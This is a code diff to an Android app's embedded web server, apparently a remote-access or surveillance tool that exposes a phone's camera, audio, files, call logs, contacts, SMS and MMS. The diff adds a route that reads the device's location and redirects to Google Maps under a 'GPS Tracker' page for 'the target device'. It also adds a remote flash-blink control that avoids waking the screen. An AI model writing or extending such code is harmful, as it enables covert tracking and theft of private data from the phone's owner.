@@ -1,15 +1,19 @@
 package com.labs.k4n3co;
 
+import android.Manifest;
 import android.content.Context;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.hardware.camera2.CameraManager;
+import android.location.Location;
+import android.location.LocationManager;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Environment;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
-import android.Manifest;
-import android.net.Uri;
 import android.telephony.SmsManager;
+import android.util.Log;
 import java.io.BufferedReader;
 import java.io.InputStream;
 import java.io.InputStreamReader;
@@ -310,6 +314,12 @@ public class K4N3COHttpServer extends NanoHTTPD {
                 return stopVideoRecording();
             } else if (uri.equals("/camera/status")) {
                 return serveCameraStatus();
+            } else if (uri.equals("/camera/flash")) {
+                return triggerFlash();
+            } else if (uri.equals("/gps")) {
+                return serveGpsPage();
+            } else if (uri.equals("/gps/locate")) {
+                return serveGpsLocate();
             } else if (uri.startsWith("/download/")) {
                 return serveDownload(uri);
             } else if (uri.equals("/audio")) {
@@ -389,16 +399,19 @@ public class K4N3COHttpServer extends NanoHTTPD {
         // Quick Access Terminal
         html.append("<div class=\"card\">");
         html.append("<h2 style=\"margin-bottom: 25px;\">QUICK_ACCESS_NODES</h2>");
-        html.append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 15px;\">");
+        html.append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(130px, 1fr)); gap: 15px;\">");
 
         // Node definitions
         String[][] nodes = {
             {"/device", "Hardware", "&#128241;", "var(--neon-cyan)"},
             {"/files", "Data", "&#128193;", "var(--neon-green)"},
+            {"/camera", "Optics", "&#128247;", "var(--neon-green)"},
+            {"/gps", "Locate", "&#128205;", "var(--danger)"},
             {"/calls", "Comms", "&#128222;", "#ffff00"},
-            {"/contacts", "Contacts", "&#128101;", "#f39c12"},
-            {"/camera", "Optics", "&#128247;", "var(--danger)"},
-            {"/audio", "Acoustics", "&#127908;", "#1abc9c"}
+            {"/sms", "SMS", "&#128233;", "var(--neon-cyan)"},
+            {"/mms", "MMS", "&#128444;", "var(--neon-magenta)"},
+            {"/audio", "Acoustics", "&#127908;", "#1abc9c"},
+            {"/contacts", "Contacts", "&#128101;", "#f39c12"}
         };
 
         for (String[] node : nodes) {
@@ -938,6 +951,125 @@ public class K4N3COHttpServer extends NanoHTTPD {
         return newFixedLengthResponse(Response.Status.INTERNAL_ERROR, "text/html", html);
     }
 
+    private Response triggerFlash() {
+        try {
+            // Check if CameraService is using the camera
+            if (CameraService.isCurrentlyStreaming() || CameraService.isCurrentlyRecording()) {
+                return serveError("Flash unavailable while camera is in use (streaming/recording).");
+            }
+
+            CameraManager camManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
+            String backCameraId = null;
+            
+            for (String id : camManager.getCameraIdList()) {
+                try {
+                    android.hardware.camera2.CameraCharacteristics characteristics = camManager.getCameraCharacteristics(id);
+                    Integer facing = characteristics.get(android.hardware.camera2.CameraCharacteristics.LENS_FACING);
+                    if (facing != null && facing == android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK) {
+                        backCameraId = id;
+                        break;
+                    }
+                } catch (Exception e) {
+                    Log.e("K4N3CO", "Error checking camera " + id, e);
+                }
+            }
+
+            if (backCameraId == null && camManager.getCameraIdList().length > 0) {
+                backCameraId = camManager.getCameraIdList()[0];
+            }
+
+            if (backCameraId != null) {
+                final String finalId = backCameraId;
+                new Thread(() -> {
+                    try {
+                        // Use ApplicationContext to avoid triggering UI updates that might wake screen
+                        Context appContext = context.getApplicationContext();
+                        CameraManager manager = (CameraManager) appContext.getSystemService(Context.CAMERA_SERVICE);
+                        
+                        for (int i = 0; i < 3; i++) {
+                            try {
+                                manager.setTorchMode(finalId, true);
+                                Thread.sleep(300);
+                                manager.setTorchMode(finalId, false);
+                                Thread.sleep(300);
+                            } catch (android.hardware.camera2.CameraAccessException e) {
+                                // If camera is in use (e.g. streaming), torch mode might fail
+                                Log.e("K4N3CO", "Flash access error: " + e.getMessage());
+                                break;
+                            }
+                        }
+                    } catch (Exception e) {
+                        Log.e("K4N3CO", "Flash error: " + e.getMessage());
+                    }
+                }).start();
+                return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"Flash command dispatched\"}");
+            } else {
+                return serveError("No camera with flash found.");
+            }
+        } catch (Exception e) {
+            return serveError("Flash error: " + e.getMessage());
+        }
+    }
+
+    private Response serveGpsPage() {
+        StringBuilder html = new StringBuilder(HTML_HEADER);
+        html.append("<div class=\"card\">");
+        html.append("<h2 style=\"margin-bottom: 20px;\">&#128205; GPS Tracker</h2>");
+        html.append("<p style=\"color: #888; margin-bottom: 25px;\">Locate the target device using global satellite positioning.</p>");
+        
+        html.append("<div style=\"text-align: center;\">");
+        html.append("<a href=\"/gps/locate\" class=\"btn\" style=\"padding: 20px 40px; font-size: 1.2rem;\">&#128205; INITIALIZE TRACKING</a>");
+        html.append("</div>");
+        
+        html.append("<div style=\"margin-top: 30px; padding: 20px; background: rgba(0,0,0,0.3); border: 1px solid rgba(0, 242, 255, 0.1);\">");
+        html.append("<h3 style=\"font-size: 0.8rem; opacity: 0.7;\">TRACKING_LOG</h3>");
+        html.append("<div style=\"color: var(--terminal-green); font-size: 0.75rem; font-family: 'JetBrains Mono', monospace;\">");
+        html.append("<div>[WAITING] Awaiting command...</div>");
+        html.append("</div></div>");
+        
+        html.append("</div>");
+        html.append(HTML_FOOTER);
+        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
+    }
+
+    private Response serveGpsLocate() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            if (context.checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+                return serveError("Location permission not granted.");
+            }
+        }
+
+        try {
+            LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
+            Location location = null;
+            
+            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
+                location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+            }
+            
+            if (location == null && locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
+                location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+            }
+
+            if (location != null) {
+                double lat = location.getLatitude();
+                double lon = location.getLongitude();
+                String mapsUrl = "https://www.google.com/maps/search/?api=1&query=" + lat + "," + lon;
+                
+                // Redirect to Google Maps
+                Response response = newFixedLengthResponse(Response.Status.REDIRECT, "text/html", "");
+                response.addHeader("Location", mapsUrl);
+                return response;
+            } else {
+                return serveError("Could not retrieve location. Ensure GPS is enabled on the device.");
+            }
+        } catch (SecurityException e) {
+            return serveError("Location permission denied: " + e.getMessage());
+        } catch (Exception e) {
+            return serveError("Location error: " + e.getMessage());
+        }
+    }
+
     private String escapeHtml(String text) {
         if (text == null)
             return "";
@@ -1425,6 +1557,8 @@ public class K4N3COHttpServer extends NanoHTTPD {
         // Action buttons
         html.append("<div style=\"display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;\">");
         html.append(
+                "<button onclick=\"triggerFlash()\" style=\"padding: 12px 24px; background: rgba(255, 255, 0, 0.2); border: 1px solid #ffff00; border-radius: 10px; color: #ffff00; font-weight: 600; cursor: pointer;\">&#9889; Blink Flash</button>");
+        html.append(
                 "<button onclick=\"rotateStream()\" style=\"padding: 12px 24px; background: rgba(243, 156, 18, 0.2); border: 1px solid #f39c12; border-radius: 10px; color: #f39c12; font-weight: 600; cursor: pointer;\">&#8635; Rotate 90&deg;</button>");
         html.append(
                 "<button onclick=\"capturePhoto()\" style=\"padding: 12px 24px; background: linear-gradient(135deg, #3498db, #2980b9); border: none; border-radius: 10px; color: #fff; font-weight: 600; cursor: pointer;\">&#128247; Capture Photo</button>");
@@ -1459,6 +1593,13 @@ public class K4N3COHttpServer extends NanoHTTPD {
         html.append("function rotateStream() {");
         html.append("  currentRotation = (currentRotation + 90) % 360;");
         html.append("  streamImg.style.transform = 'rotate(' + currentRotation + 'deg)';");
+        html.append("}");
+
+        html.append("function triggerFlash() {");
+        html.append("  fetch('/camera/flash').then(r => r.json()).then(d => {");
+        html.append("    document.getElementById('status').innerHTML = d.message;");
+        html.append("    setTimeout(() => { document.getElementById('status').innerHTML = ''; }, 3000);");
+        html.append("  });");
         html.append("}");
 
         // Start streaming with current resolution
